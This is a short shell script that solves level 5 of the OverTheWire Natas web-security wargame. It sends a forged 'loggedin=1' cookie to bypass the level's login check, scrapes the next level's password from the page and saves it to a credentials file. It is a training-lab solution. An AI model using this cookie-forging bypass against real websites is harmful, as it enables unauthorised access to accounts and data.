#!/bin/sh

level="natas5"
url="http://$level.natas.labs.overthewire.org"
web_auth=$(grep ^$level credentials)
cookie="loggedin=1"

echo -n "[i] Target: $url\n"
next_password=$(curl -u $web_auth --cookie $cookie -sL $url 2>&1 | grep "password for natas6" | cut -d " " -f 8 | cut -d "<" -f 1)
echo -n "[+] Password for the next level: $next_password\n"
echo "natas6:$next_password" >> ./credentials
